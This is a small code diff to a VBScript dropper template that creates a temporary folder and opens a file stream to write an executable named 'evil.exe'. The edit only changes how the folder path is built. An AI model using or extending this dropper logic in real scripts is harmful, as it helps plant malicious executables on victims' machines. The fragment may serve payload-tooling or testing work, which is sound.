@@ -9,7 +9,7 @@
 		Dim var_tempexe
 		Dim var_basedir
 		Set var_tempdir = "x:\"
-		var_basedir = var_tempdir & "\" & var_obj.GetTempName()
+		var_basedir = "x:\" & var_obj.GetTempName()
 		var_obj.CreateFolder(var_basedir)
 		var_tempexe = var_basedir & "\" & "evil.exe"
 		Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
